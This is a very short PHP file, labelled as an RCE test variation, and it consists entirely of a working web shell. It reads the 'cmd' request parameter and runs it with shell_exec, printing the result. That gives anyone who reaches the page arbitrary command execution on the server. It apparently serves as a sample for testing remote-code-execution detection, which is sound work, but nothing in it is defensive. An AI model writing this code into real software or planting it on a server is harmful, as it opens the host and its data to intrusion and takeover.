<?php
// RCE test variation #18
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>